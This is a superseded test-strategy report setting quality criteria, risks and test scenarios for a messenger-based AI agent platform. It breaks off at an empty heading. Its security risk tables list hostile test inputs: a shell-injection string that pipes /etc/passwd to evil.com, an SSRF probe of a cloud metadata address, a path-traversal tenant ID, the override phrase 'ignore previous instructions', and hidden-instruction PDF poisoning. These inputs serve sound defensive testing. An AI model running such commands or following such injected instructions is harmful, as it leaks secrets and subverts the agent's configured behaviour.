> **SUPERSEDED:** This document references ADR-006..013 which were deleted during the v2 ADR rewrite (commit e54143f). ADR-001..005 v2 now cover this scope. Retained for historical context only.

# QCSD Ideation Report: ADR-010 through ADR-013

## Quality Criteria Session Document (QCSD) v6.3

**Scope:** ADR-010 (Streaming Response Pipeline), ADR-011 (User Training & Customization via Messenger), ADR-012 (Modular Plugin Architecture), ADR-013 (Cloud.ru AI Fabric Agent Integration)

**Date:** 2026-02-13

**Method:** HTSM v6.3 (Heuristic Test Strategy Model) + Risk Storming + Testability Assessment

**Status:** ACTIVE

---

## 1. HTSM v6.3 Analysis

### 1.1 ADR-010: Streaming Response Pipeline

#### Functionality

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| StreamParser must emit onToken for every `assistant/text` event | 100% event coverage; zero dropped tokens | Token loss renders partial responses nonsensical |
| TokenAccumulator flushes at configured interval | Flush fires within +/-50ms of `flushIntervalMs` | Timing drift causes rate limit violations or stale UX |
| Fallback to batch mode on first PARSE_ERROR | Transition to FALLBACK_BATCH within 200ms of error | Users must never see a raw error; graceful degradation is mandatory |
| Long message splitting preserves markdown structure | Split never breaks a code block, heading, or link | Broken markdown renders as garbled text in Telegram/MAX |
| Typing indicator sent within 500ms of user message | Measured from message receipt to `sendChatAction` call | ADR explicitly requires 500ms threshold for UX parity |

#### Reliability

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| ResponseStream garbage-collected within 5 minutes | Hard timeout kills subprocess; memory freed | Prevents resource leak under stuck subprocess conditions |
| At most one active ResponseStream per conversation | Concurrent requests rejected or queued | Duplicate streams cause message interleaving in chat |
| Timer cleanup on cancel/finalize | Zero leaked `setInterval` handles after stream ends | Leaked timers accumulate memory and CPU over hours |
| Partial text delivery on ERRORED state | User receives accumulated text if >= 1 character | Silent failure with no output is worse than truncated output |

#### Performance

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Time-to-first-token (TTFT) | < 3 seconds from user message to first visible text | Competitive with ChatGPT streaming UX |
| StreamParser throughput | >= 10,000 tokens/second parsing rate | Must not bottleneck the upstream SSE feed |
| Memory per active stream | < 2 MB including buffer and parser state | Supports 50+ concurrent streams on a 256 MB container |
| editMessageText call frequency | <= 1 call/second per chat on Telegram; <= 30 RPS total on MAX | Platform rate limit compliance |

#### Security

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| No raw subprocess stderr exposed to user | Error messages sanitized before delivery | Subprocess stderr may contain file paths, API keys, or stack traces |
| Stream content sanitized for XSS in web adapter | All `<script>` tags stripped before SSE delivery | Web SSE sink directly injects into client DOM |
| Session lock prevents cross-conversation stream hijacking | Stream bound to chatId+sessionId tuple | Isolation between concurrent users is a DDD invariant |

#### Maintainability

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Module stays under 500 lines per file | Per CLAUDE.md project rules | Enforced by linting |
| All public interfaces exported from barrel index.ts | 100% of types documented with JSDoc | Enables third-party consumption per ADR-012 |
| State machine transitions covered by unit tests | Every edge in the ResponseStream FSM exercised | State machines are the highest-risk logic pattern |

---

### 1.2 ADR-011: User Training & Customization via Messenger

#### Functionality

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| `/train add rule` appends to correct CLAUDE.md section | Rule appears in rendered markdown under named section header | Misplaced rules could override security constraints |
| CLAUDE.md version increments monotonically on every mutation | No version reuse after rollback; strictly increasing | DDD invariant; audit trail integrity |
| `/knowledge add` indexes document in tenant-scoped RAG collection | Document retrievable via `/knowledge search` within 30 seconds | RAG ingestion has async pipeline; must converge |
| `/tool add` health-checks MCP server before registration | Registration fails if health check returns unreachable | Prevents dead tools from polluting the registry |
| `/export` bundle contains all non-secret configuration | Round-trip: export then import on fresh tenant yields identical behavior | Portability promise of the ADR |
| Command parser returns `ParseError` with suggestion for malformed input | Suggestion matches within Levenshtein distance 3 of known commands | Prevents silent misinterpretation of user intent |

#### Reliability

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| CLAUDE.md rollback restores exact previous version | Byte-for-byte match with history file | Corruption during rollback breaks all subsequent agent invocations |
| Concurrent training commands serialized per tenant | Second command waits; no data race on CLAUDE.md file | Two users editing the same tenant simultaneously |
| Auto-learn does not store hallucinated corrections | False positive rate < 5% on correction detection | Noisy memory pollutes agent behavior over time |
| Tenant data isolation | Training command for tenant A never reads/writes tenant B files | Critical invariant; filesystem path validation enforced |

#### Performance

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| `/train add rule` round-trip < 500ms | From command receipt to confirmation message sent | Training should feel instant in chat UX |
| `/knowledge add` for 50 MB PDF completes within 60 seconds | Including upload, chunking, embedding, indexing | Largest allowed file size per ADR constraints |
| AgentDB semantic search latency < 200ms for 10K entries | HNSW index query time at tenant scale | Must not add perceptible delay to agent invocation |
| Rate limit: 10 training commands/minute/tenant enforced | 11th command within 60 seconds returns rate limit error | Prevents abuse and runaway automation |

#### Security

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Rule text sanitized: no markdown injection | Control characters, HTML tags, and backtick sequences stripped | Injected markdown could override CLAUDE.md header structure |
| CLAUDE.md prompt injection blocked | Rules containing "ignore previous instructions" or equivalent patterns rejected | Direct attack vector on LLM behavior |
| MCP URL allowlist enforced | Private IPs (10.x, 172.16-31.x, 192.168.x, 127.x) blocked | SSRF prevention |
| Hook commands sanitized for shell injection | Semicolons, pipes, backticks, `$()` rejected in handler strings | User-supplied hook commands execute on host |
| Export excludes MCP auth tokens and API keys | `auth.token` and `auth.value` fields replaced with placeholder | Secret leakage through export bundles |

#### Maintainability

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Command parser is table-driven, not if/else chain | New commands added by adding a row to pattern table | Scalable to 30+ command types without spaghetti |
| Each manager (ClaudeMd, Knowledge, Tool, etc.) independently testable | Zero cross-manager imports in unit tests | London School TDD; mock-first boundaries |
| CLAUDE.md rendering is deterministic | Same ClaudeMdDocument always renders to identical string | Enables snapshot testing |

---

### 1.3 ADR-012: Modular Plugin Architecture

#### Functionality

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| DI container resolves all 8 modules without error at startup | `container.build()` succeeds with zero unresolved tokens | Broken wiring is a showstopper |
| Circular dependency detected and rejected at build time | `container.build()` throws `CircularDependencyError` | Runtime circular resolution causes stack overflow |
| Plugin registry health check aggregates all module statuses | If any critical module is unhealthy, system reports degraded | Health propagation invariant from ADR |
| Event bus delivers events to all registered handlers | Zero dropped events under normal operation | Cross-module communication correctness |
| Scoped containers provide tenant isolation | Resolving from tenant-A scope never returns tenant-B singleton | Multi-tenancy isolation enforcement |

#### Reliability

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Module disposal executes in reverse dependency order | On `container.dispose()`, no module is disposed before its dependents | Prevents null reference during shutdown cascade |
| Event bus handler failure does not crash emitter | Handler exceptions logged but do not propagate to `emit()` | Fault isolation between modules |
| Plugin unregistration cleans up resources | `unregister()` calls `dispose()` if available; removes from health check | Prevents memory leaks from hot-reloaded plugins |

#### Performance

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Container resolution < 1ms for singleton services | Benchmarked with 8 registered services | Hot path for every request |
| Event bus dispatch < 0.5ms for synchronous emit | Measured with 10 handlers registered | Event emit is on critical message path |
| Scoped container creation < 0.1ms | Benchmarked for per-request scoping | Created on every incoming message |

#### Security

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Third-party plugins cannot access other plugin internals | Plugin factory receives only declared dependencies | Prevents privilege escalation through DI |
| No shared mutable state between modules | All cross-module communication via event bus or interface calls | DDD invariant; prevents race conditions |

#### Maintainability

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Each `@openclaw/*` package has zero required internal dependencies | Verified by `depcheck` in CI | Module independence invariant |
| Published interfaces in `types.ts` follow semver | Breaking changes trigger major version bump | Consumer stability contract |
| Package structure convention followed by all 8 modules | `src/index.ts`, `src/types.ts`, `package.json`, `tsconfig.json` present | Consistency enables tooling automation |

---

### 1.4 ADR-013: Cloud.ru AI Fabric Agent Integration

#### Functionality

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| IAgentProvider polymorphism: ClaudeCodeCli, CloudRuAgent, and CloudRuAgentSystem all pass same test suite | 100% interface compliance across 3 implementations | Contract testing validates substitutability |
| HybridOrchestrator routes by capability pattern | Glob match `code-*` routes to cloudru-coder provider | Core routing logic correctness |
| McpFederation handles tool name collisions with namespacing | Colliding tools resolvable via `server:toolname` | Prevents ambiguous tool calls |
| Circuit breaker opens after 3 consecutive failures | 4th request routes to fallback provider | Prevents cascading failure to degraded provider |
| MCP auto-discovery populates tool index on startup | Tools from Cloud.ru managed servers available within 10 seconds of boot | Startup sequence correctness |

#### Reliability

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Cloud.ru API outage degrades to local-only execution | All requests route to claude-cli when all remote providers have open circuit breakers | Graceful degradation; no total outage |
| Cold start handling: requests to COOLED agents succeed within 30 seconds | Agent transitions from COOLED to RUNNING before timeout | ADR documents 10-30s cold start latency |
| Rate limit 15 req/s enforced per Cloud.ru API key | Client-side rate limiter prevents 429 responses | Proactive rate limiting avoids server-side throttling |
| Fan-out partial failures: successful sub-tasks returned even if others fail | `Promise.allSettled` semantics preserved | Compound tasks must not fail atomically |

#### Performance

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Provider selection latency < 5ms | Routing rule matching + circuit breaker check | On critical request path |
| Streaming from Cloud.ru agent: TTFT < 5 seconds | Including network latency to Cloud.ru API | Remote agents inherently slower than local |
| MCP tool call round-trip < 2 seconds for managed servers | SSE transport to Cloud.ru MCP endpoint | Tool calls block agent reasoning loop |

#### Security

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| API keys never stored in openclaw.json | Config validator rejects config containing inline keys | Credential isolation invariant |
| CLOUDRU_AGENTS_API_KEY read from environment only | No fallback to config file; validation throws on missing env var | Defense in depth |
| MCP server registration validates URL against blocklist | Private IPs and localhost rejected for SSE transport | SSRF prevention consistent with ADR-011 |
| Cloud.ru auth headers not logged at any log level | Headers redacted in HTTP client debug logs | Prevents credential leakage to log aggregators |

#### Maintainability

| Criterion | Threshold | Rationale |
|-----------|-----------|-----------|
| Anti-corruption layer isolates Cloud.ru API changes | Provider implementations can be updated without changing IAgentProvider interface | Adapter pattern protects consumers |
| Config schema validated at load time with descriptive errors | Invalid config fails fast with field-level error messages | Prevents runtime surprises from misconfiguration |
| Each provider independently testable with HTTP mocks | No real Cloud.ru API calls in unit tests | Fast, deterministic CI |

---

## 2. Risk Storming

### 2.1 ADR-010: Streaming Response Pipeline

| Risk ID | Category | Risk Description | Probability | Impact | P x I Score | Test Scenario |
|---------|----------|-----------------|:-----------:|:------:|:-----------:|---------------|
| R010-01 | Architectural | `stream-json` format changes in Claude Code update break StreamParser | Low | High | 6 | Feed stream-json output from Claude Code v2.x and v3.x; verify parser handles both or reports clear PARSE_ERROR |
| R010-02 | Operational | Telegram `editMessageText` rate limit hit under concurrent users | Medium | Medium | 9 | Simulate 50 concurrent streaming responses editing at 1/s; measure 429 rate from Telegram API mock |
| R010-03 | Operational | MAX 30 RPS shared limit exhausted by streaming edits | Medium | High | 12 | Simulate 20 concurrent streams + 15 non-streaming operations; verify adaptive flush interval increases |
| R010-04 | Reliability | Subprocess stdout buffering delays token delivery by seconds | Low | Low | 2 | Measure TTFT with and without `PYTHONUNBUFFERED=1`; verify < 500ms difference |
| R010-05 | Reliability | Proxy drops SSE connection mid-stream leaving partial response | Medium | Medium | 9 | Kill proxy process after 50 tokens delivered; verify FALLBACK_BATCH delivers accumulated text |
| R010-06 | Reliability | Memory leak from uncleaned timers/readline interfaces | Low | Medium | 4 | Run 1000 sequential stream lifecycles; measure heap growth < 10 MB total |
| R010-07 | Security | Subprocess stderr containing API keys forwarded to user | Low | Critical | 8 | Inject ANTHROPIC_API_KEY into stderr output; verify sanitization strips it |
| R010-08 | UX | Message edit flickering on slow mobile connections | Medium | Low | 4 | Throttle network to 3G (300ms RTT); count visible flicker events in Telegram client |

### 2.2 ADR-011: User Training & Customization via Messenger

| Risk ID | Category | Risk Description | Probability | Impact | P x I Score | Test Scenario |
|---------|----------|-----------------|:-----------:|:------:|:-----------:|---------------|
| R011-01 | Security | CLAUDE.md prompt injection via `/train add rule` | Medium | High | 12 | Submit rules containing "Ignore all previous instructions" variants; verify rejection or neutralization |
| R011-02 | Security | MCP server SSRF via `/tool add` with internal URL | Medium | Critical | 15 | Register `http://169.254.169.254/latest/meta-data/` as MCP server; verify URL blocklist rejection |
| R011-03 | Security | Shell injection via `/hook add` handler string | Medium | Critical | 15 | Submit handler `npm test; curl evil.com/$(cat /etc/passwd)`; verify sanitization rejects it |
| R011-04 | Data | CLAUDE.md corruption from concurrent writes | Low | Medium | 4 | Send 20 `/train add rule` commands simultaneously from two users on same tenant; verify no data loss |
| R011-05 | Data | RAG poisoning via malicious document upload | Low | High | 6 | Upload PDF containing hidden text with misleading instructions; verify content scanning detects it |
| R011-06 | Data | Tenant data leakage through path traversal in tenantId | Low | Critical | 8 | Craft tenantId as `../other-tenant`; verify filesystem path sanitization |
| R011-07 | Operational | AgentDB memory bloat from auto-learn false positives | Medium | Low | 4 | Run 500 conversations; measure memory entries created; verify < 5% are incorrect corrections |
| R011-08 | Operational | CLAUDE.md exceeds 32 KB limit from accumulated rules | Low | Medium | 4 | Add 51 rules to the largest section; verify size limit enforcement and descriptive error |
| R011-09 | Reliability | Export/import round-trip loses configuration fidelity | Low | Medium | 4 | Export tenant A; import into fresh tenant B; diff all manager states; verify identical |

### 2.3 ADR-012: Modular Plugin Architecture

| Risk ID | Category | Risk Description | Probability | Impact | P x I Score | Test Scenario |
|---------|----------|-----------------|:-----------:|:------:|:-----------:|---------------|
| R012-01 | Architectural | Interface instability in v0.x causes consumer breakage | High | Medium | 12 | Maintain compatibility test suite; run against v0.1, v0.2, v0.3 interfaces |
| R012-02 | Architectural | Circular dependency introduced between packages | Low | High | 6 | Run `depcheck` and custom cycle detection on package.json dependency graph in CI |
| R012-03 | Operational | Version skew between @openclaw packages causes runtime type mismatch | Medium | Medium | 9 | Install mismatched versions of llm-router and core; verify TypeScript compilation fails or runtime validation catches |
| R012-04 | Architectural | Event bus becomes hidden coupling pathway | Medium | Low | 4 | Audit all event handlers; verify none contain business logic or state mutations |
| R012-05 | Performance | DI container resolution overhead on hot path | Low | Low | 2 | Benchmark 100K sequential `container.get()` calls; verify < 1ms per call |
| R012-06 | Reliability | Plugin disposal deadlock during shutdown | Low | Medium | 4 | Register 8 plugins with bidirectional optional dependencies; call `dispose()`; verify completes within 5 seconds |
| R012-07 | Security | Third-party plugin accesses undeclared dependency via container | Low | High | 6 | Register plugin declaring zero dependencies; attempt `container.get("TenantManager")`; verify throws |

### 2.4 ADR-013: Cloud.ru AI Fabric Agent Integration

| Risk ID | Category | Risk Description | Probability | Impact | P x I Score | Test Scenario |
|---------|----------|-----------------|:-----------:|:------:|:-----------:|---------------|
| R013-01 | Architectural | Cloud.ru API breaking changes invalidate provider implementation | Low | High | 6 | Mock Cloud.ru API with v1 and hypothetical v2 response schemas; verify adapter handles both or fails gracefully |
| R013-02 | Operational | Cold start exceeds user-facing timeout on COOLED agent | Medium | Medium | 9 | Mock Cloud.ru agent returning first response after 25s delay; verify user receives "Agent warming up" indicator |
| R013-03 | Operational | Rate limit 15 req/s exceeded during fan-out to Agent System | Medium | High | 12 | Fan-out 5 sub-tasks simultaneously from 4 concurrent users; verify client-side rate limiter queues excess requests |
| R013-04 | Security | API key leak through config file or log output | Low | Critical | 8 | Search all log output and config serialization for `CLOUDRU_AGENTS_API_KEY` value; verify absent |
| R013-05 | Reliability | MCP server unavailability cascades to agent failure | Medium | Medium | 9 | Disconnect managed MCP server mid-tool-call; verify agent receives tool error and can continue reasoning |
| R013-06 | Reliability | Circuit breaker flapping causes oscillating route changes | Low | Low | 2 | Simulate alternating success/failure pattern; verify half-open state probes correctly |
| R013-07 | Architectural | Cloud.ru A2A protocol incompatible with expected semantics | High | Low | 4 | Test Agent System delegation with real (or accurately mocked) A2A protocol; document deviations |
| R013-08 | Data | MCP tool name collision across Cloud.ru managed and custom servers | Medium | Low | 4 | Register two servers both exposing `search` tool; verify unqualified call fails with descriptive error; qualified call succeeds |

---

## 3. Testability Assessment

### 3.1 ADR-010: Streaming Response Pipeline

#### Test Doubles Needed

| Double | Type | Purpose |
|--------|------|---------|
| `MockChildProcess` | Fake | Simulates subprocess stdout with timed line emission; supports configurable delays between lines |
| `MockTelegramApi` | Stub | Records `sendChatAction`, `sendMessage`, `editMessageText` calls with arguments |
| `MockMaxApi` | Stub | Records MAX Bot API calls; simulates 429 rate limit responses on demand |
| `FakeReadline` | Fake | Emits lines from a predefined array with configurable timing |
| `StubTimer` | Stub | Replaces `setInterval`/`setTimeout` with manual tick advancement (sinon `useFakeTimers`) |

#### Integration Boundaries

- **StreamParser <-> subprocess stdout**: Unit testable with string array input
- **TokenAccumulator <-> MessengerStreamAdapter**: Integration test with mock adapter
- **StreamingResponseHandler <-> all components**: Integration test with MockChildProcess and MockTelegramApi
- **runCliAgent() <-> StreamingResponseHandler**: Integration test verifying the handoff from existing code

#### Test Split

| Layer | Ratio | Count Estimate |
|-------|-------|---------------|
| Unit | 70% | ~25 tests (parser states, accumulator flush logic, message splitting) |
| Integration | 25% | ~9 tests (full pipeline with mock subprocess, adapter wire-up) |
| E2E | 5% | ~2 tests (real subprocess + real Telegram test bot in staging) |

---

### 3.2 ADR-011: User Training & Customization via Messenger

#### Test Doubles Needed

| Double | Type | Purpose |
|--------|------|---------|
| `MockFilesystem` | Fake | In-memory filesystem for CLAUDE.md read/write/history operations |
| `MockRagClient` | Stub | Simulates Cloud.ru Managed RAG API responses for upload, search, stats |
| `MockAgentDB` | Stub | In-memory HNSW-like store; supports store, search, retrieve, delete |
| `MockMcpClient` | Stub | Simulates MCP server health check and tools/list responses |
| `FakeClock` | Fake | Controls `Date.now()` for TTL-based memory cleanup testing |

#### Integration Boundaries

- **CommandParser <-> TrainingEngine**: Unit testable; parser is pure function
- **ClaudeMdManager <-> filesystem**: Integration test with real temp filesystem or mock
- **KnowledgeManager <-> Cloud.ru RAG API**: Integration test with MockRagClient
- **ToolRegistry <-> MCP server**: Integration test with MockMcpClient
- **TrainingEngine <-> all managers**: Integration test verifying command routing

#### Test Split

| Layer | Ratio | Count Estimate |
|-------|-------|---------------|
| Unit | 65% | ~35 tests (parser, validators, each manager CRUD, sanitization) |
| Integration | 30% | ~16 tests (engine orchestration, filesystem persistence, RAG flow) |
| E2E | 5% | ~3 tests (Telegram bot command to CLAUDE.md change to agent behavior) |

---

### 3.3 ADR-012: Modular Plugin Architecture

#### Test Doubles Needed

| Double | Type | Purpose |
|--------|------|---------|
| `StubPlugin` | Stub | Minimal `Plugin<T>` implementation for registry tests |
| `FakeContainer` | Fake | In-memory DI container for isolation testing |
| `SpyEventBus` | Spy | Records emitted events and handler invocations |
| `MockHealthCheck` | Stub | Returns configurable health status per plugin |
| `ErrorPlugin` | Stub | Plugin whose factory throws; tests error handling paths |

#### Integration Boundaries

- **PluginRegistry <-> Plugin[]**: Unit testable; in-memory
- **DependencyContainer <-> ServiceRegistration[]**: Unit testable; topological sort algorithm
- **EventBus <-> handlers**: Integration test with multiple real handlers
- **CompositionRoot <-> all 8 modules**: Integration test with stub implementations of each interface

#### Test Split

| Layer | Ratio | Count Estimate |
|-------|-------|---------------|
| Unit | 80% | ~30 tests (registry CRUD, container resolution, event dispatch, lifecycle) |
| Integration | 18% | ~7 tests (composition root wiring, cross-module event flow) |
| E2E | 2% | ~1 test (full application boot with all real modules) |

---

### 3.4 ADR-013: Cloud.ru AI Fabric Agent Integration

#### Test Doubles Needed

| Double | Type | Purpose |
|--------|------|---------|
| `MockCloudRuApi` | Fake | HTTP server simulating Cloud.ru AI Agents API responses including SSE streaming |
| `MockCircuitBreaker` | Spy | Records open/close transitions; allows manual state control |
| `FakeAgentProvider` | Fake | Minimal IAgentProvider for orchestrator routing tests |
| `MockMcpServer` | Fake | Local MCP server (stdio) for federation integration tests |
| `StubSseStream` | Stub | Emits predefined SSE chunks for streaming provider tests |

#### Integration Boundaries

- **CloudRuAgentProvider <-> Cloud.ru API**: Integration test with MockCloudRuApi HTTP server
- **HybridOrchestrator <-> IAgentProvider[]**: Unit testable with FakeAgentProvider instances
- **McpFederation <-> MCP servers**: Integration test with MockMcpServer
- **ConfigValidator <-> AgentFabricConfig**: Unit testable; pure validation logic
- **agent-runner.ts <-> HybridOrchestrator**: Integration test verifying dispatch path change

#### Test Split

| Layer | Ratio | Count Estimate |
|-------|-------|---------------|
| Unit | 60% | ~22 tests (provider mapping, routing rules, circuit breaker state machine, config validation) |
| Integration | 35% | ~13 tests (HTTP mock server, MCP federation, streaming provider, startup sequence) |
| E2E | 5% | ~2 tests (real Cloud.ru API in staging environment with test agent) |

---

## 4. Quality Criteria Matrix

| Quality Characteristic | ADR-010 Streaming Pipeline | ADR-011 Training Engine | ADR-012 Plugin Architecture | ADR-013 AI Fabric Integration |
|----------------------|---------------------------|------------------------|---------------------------|-------------------------------|
| **Functionality** | Token delivery fidelity: 0 dropped tokens. Fallback within 200ms. Typing indicator < 500ms. | Command round-trip < 500ms. Export/import round-trip lossless. Idempotent commands. | All 8 modules resolve at startup. Circular deps rejected. Event delivery 100%. | IAgentProvider polymorphism: 3 impls pass same suite. Routing glob match correct. |
| **Reliability** | 5-min hard timeout. Single stream per conversation. Timer cleanup on every path. | CLAUDE.md rollback byte-exact. Concurrent writes serialized. Tenant isolation absolute. | Disposal in reverse order. Handler failure isolated. Plugin hot-reload clean. | Cloud.ru outage degrades to local. Cold start handled within 30s. Fan-out partial success. |
| **Performance** | TTFT < 3s. Parser >= 10K tok/s. Memory < 2 MB/stream. Rate limit compliance. | Rule add < 500ms. 50 MB PDF indexed < 60s. Semantic search < 200ms. | Resolution < 1ms. Event dispatch < 0.5ms. Scope creation < 0.1ms. | Provider selection < 5ms. Remote TTFT < 5s. MCP call < 2s. |
| **Security** | No stderr leakage. XSS sanitization. Session-bound streams. | Prompt injection blocked. SSRF blocked. Shell injection blocked. Export sanitized. | Plugin sandbox: declared deps only. No shared mutable state. | Keys in env only. Auth headers not logged. MCP URL blocklist. |
| **Maintainability** | Files < 500 lines. Full JSDoc. FSM coverage. | Table-driven parser. Independent managers. Deterministic render. | Zero required internal deps. Semver on interfaces. Consistent structure. | Anti-corruption layer. Config validation. Independent provider tests. |
| **Testability** | 70/25/5 unit/integration/E2E. Mock subprocess. Fake timers. | 65/30/5 split. Mock filesystem. Mock RAG. Mock MCP. | 80/18/2 split. Stub plugins. Spy event bus. | 60/35/5 split. Mock HTTP server. Fake providers. Mock MCP. |

---

## 5. Missing Quality Scenarios

### 5.1 Edge Cases Not Covered in ADRs

#### ADR-010

1. **Empty stream**: Cloud.ru FM returns zero tokens (empty response). The StreamParser should emit `onComplete` with empty text, and the adapter should send a "No response generated" message rather than leaving the user with only a typing indicator.

2. **Unicode surrogate pairs split across stream chunks**: A multi-byte emoji or CJK character may be split across two `stream-json` events. The StreamParser must buffer incomplete UTF-8 sequences rather than emitting broken characters.

3. **Telegram message deletion during streaming**: If the user deletes the bot's in-progress message while streaming, subsequent `editMessageText` calls will fail with "message to edit not found." The adapter must detect this and send a new message.

4. **Rapid user follow-up during active stream**: If the user sends another message while a stream is active, the session lock must reject or queue the new message. The ADR does not specify the UX for this (should the user see "Please wait for the current response"?).

5. **Network partition between OpenClaw and messenger API**: If the messenger API becomes unreachable mid-stream, token accumulation continues but flushes fail. The accumulator should pause flush attempts and retry with exponential backoff, eventually delivering the full response when connectivity returns.

#### ADR-011

6. **Concurrent import and training commands**: If a user runs `/import` while another user is executing `/train add rule` on the same tenant, the import could overwrite the in-flight rule addition. The import operation should acquire an exclusive lock on the UserConfiguration aggregate.

7. **CLAUDE.md encoding edge cases**: Rules containing non-ASCII characters (Cyrillic, emoji, RTL text) must render correctly in CLAUDE.md. The ADR does not specify encoding requirements beyond "valid markdown."

8. **Orphaned RAG collection cleanup**: If a tenant is deleted, the corresponding Cloud.ru RAG collection must be deleted. The ADR specifies tenant isolation but not the cleanup lifecycle.

9. **MCP server health degradation after registration**: A server passes health check at registration but becomes unreachable later. The ADR notes "Subsequent failures are logged but do not auto-remove the server." There should be a health monitoring loop that marks degraded servers and warns the user.

10. **Auto-learn from multi-turn conversations**: The auto-learn system may misidentify rhetorical questions as corrections. Example: "No, I meant the approach where we use Redis" could be a correction or a new instruction. The confidence threshold for auto-learning must be tunable per tenant.

#### ADR-012

11. **Plugin factory throwing during container.build()**: If one plugin's factory throws, the build should fail with a clear error identifying the failing plugin, and all previously constructed singletons should be disposed.

12. **Event bus handler ordering**: The ADR does not specify whether handlers fire in registration order or concurrently. For audit logging, deterministic ordering is important. For performance, concurrent execution is preferred. This should be configurable.

13. **Hot-reload of plugin version**: The ADR mentions `unregister()` but does not specify an atomic upgrade path (unregister old version, register new version) that avoids a window where the plugin is unavailable.

14. **Container scope memory leak**: If scoped containers for completed requests are not disposed, they accumulate. There should be a TTL or request-lifecycle hook that auto-disposes stale scopes.

#### ADR-013

15. **Cloud.ru agent status transitions during request**: An agent in RUNNING status may transition to ON_SUSPENSION mid-request due to platform scaling decisions. The provider must handle mid-request status changes gracefully rather than returning a cryptic error.

16. **MCP tool schema validation**: The federated tool index stores input schemas reported by MCP servers, but these schemas may be invalid JSON Schema or may change between server restarts. The federation should validate schemas at registration and handle schema drift.

17. **Streaming from Cloud.ru agent through OpenClaw streaming pipeline**: The interaction between ADR-013's `CloudRuAgentProvider.stream()` and ADR-010's `StreamParser` is not defined. The provider emits `AgentEvent` types, but the streaming pipeline expects `StreamJsonEvent` types. There must be a mapping layer.

18. **Config reload without restart**: The ADR defines a startup sequence but not a runtime config reload path. If a user adds a new provider via `/tool add` (ADR-011), the HybridOrchestrator must incorporate the new provider without requiring an application restart.

### 5.2 Failure Modes Not Addressed

| Failure Mode | Affected ADRs | Expected Behavior | Test Approach |
|-------------|---------------|-------------------|---------------|
| Node.js heap exhaustion from accumulated streams | ADR-010 | Process should shed load (reject new streams) before OOM kill | Stress test: open 100 streams simultaneously; monitor heap |
| CLAUDE.md file locked by OS (Windows) or NFS stale handle | ADR-011 | Retry with exponential backoff; fail with descriptive error after 3 attempts | Mock filesystem returning EBUSY/ESTALE errors |
| PostgreSQL connection pool exhaustion in tenant-manager | ADR-012 | Queue requests; return 503 when queue full | Reduce pool to 1 connection; submit 10 concurrent tenant lookups |
| Cloud.ru API returns 503 during auto-discovery | ADR-013 | Boot succeeds with local providers only; log warning; retry discovery in background | Mock API returning 503; verify boot completes within 10s |
| Event bus handler deadlock (handler A waits for handler B) | ADR-012 | Timeout on handler execution; log and skip after 5 seconds | Register two handlers with mutual dependency; verify timeout fires |
| MCP server returns malformed JSON-RPC response | ADR-013 | McpFederation marks server as error; tool call returns descriptive error | Feed invalid JSON through mock MCP server |

### 5.3 Recovery Scenarios

| Scenario | Recovery Path | Validation |
|----------|--------------|------------|
| Streaming pipeline crash mid-response | ResponseStream transitions to ERRORED; partial text delivered; new stream allowed for retry | Verify accumulated text delivered; verify session lock released |
| CLAUDE.md corrupted (invalid markdown) | Rollback to previous version from history; alert tenant admins | Verify auto-detection of render failure; verify rollback succeeds |
| Plugin registry loses state (in-memory crash) | On restart, composition root re-registers all plugins from config | Verify all 8 modules available after simulated restart |
| Circuit breaker stuck open for Cloud.ru provider | Half-open probe after configurable interval (default 30s); re-close on success | Simulate recovery of Cloud.ru API; verify re-routing within 60s |
| RAG index corruption | Cloud.ru Managed RAG handles index rebuild; KnowledgeManager reports indexing status until ready | Query index status endpoint; verify "indexing" status propagated to user |

### 5.4 Data Consistency Scenarios

| Scenario | Consistency Requirement | Test Approach |
|----------|------------------------|---------------|
| CLAUDE.md version and file content must be atomic | If version 12 is committed, the file on disk must reflect version 12 rules | Crash process between version increment and file write; verify rollback to version 11 |
| MCP federation tool index must match registered servers | Unregistering a server must remove all its tools from the index | Unregister server; verify `listAllTools()` excludes its tools |
| Training export must be a point-in-time snapshot | Concurrent mutations during export must not create an inconsistent bundle | Start export; mutate rules mid-export; verify bundle reflects either pre- or post-mutation state, not a mix |
| Agent provider registration and routing table must be consistent | Adding a provider must make it immediately routable | Register provider; immediately submit request matching its capability; verify it receives the request |

### 5.5 Performance Degradation Scenarios

| Scenario | Degradation Pattern | Acceptable Threshold | Test Approach |
|----------|--------------------|--------------------|---------------|
| 100 concurrent streaming responses | TTFT increases due to subprocess pool contention | TTFT < 10s (relaxed from 3s baseline) | Load test with 100 concurrent mock subprocesses |
| 10,000 CLAUDE.md rules across all sections | Rule lookup and rendering slows | Render time < 100ms for 32 KB document | Generate max-size CLAUDE.md; benchmark `render()` |
| 500 registered MCP tools across 50 servers | Tool name resolution overhead | Resolution < 5ms including collision check | Populate federation with 500 tools; benchmark `callTool()` lookup |
| Cloud.ru API latency spikes to 10 seconds | User-facing response time degrades | Total response < 15s with 10s API latency (5s overhead budget) | Mock Cloud.ru API with 10s delay; measure end-to-end |
| 50 tenants with simultaneous training commands | Filesystem I/O contention on CLAUDE.md | Individual command < 2s (relaxed from 500ms baseline) | Parallel test with 50 concurrent `addRule()` calls on different tenants |

---

## 6. Cross-ADR Interaction Analysis

### 6.1 ADR-010 (Streaming) x ADR-012 (Plugins): Adapter Composition

**Interaction:** ADR-010's `MessengerStreamAdapter` implementations (TelegramStreamAdapter, MaxStreamAdapter) are platform-specific plugins. ADR-012's plugin architecture requires these adapters to be independently packaged and registered through the DI container. The `@openclaw/stream-pipeline` module depends on `@openclaw/messenger-adapters` as an optional peer dependency.

**Quality Risks:**

